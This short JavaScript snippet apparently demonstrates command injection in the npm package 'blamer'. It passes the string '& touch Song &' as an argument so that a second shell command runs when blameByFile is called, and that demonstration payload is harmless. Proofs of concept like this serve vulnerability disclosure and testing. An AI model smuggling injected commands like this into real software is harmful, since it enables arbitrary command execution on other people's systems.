var Root = require("blamer");
var attack_command = "& touch Song &";
root = new Root('git',attack_command);
root.blameByFile("./");
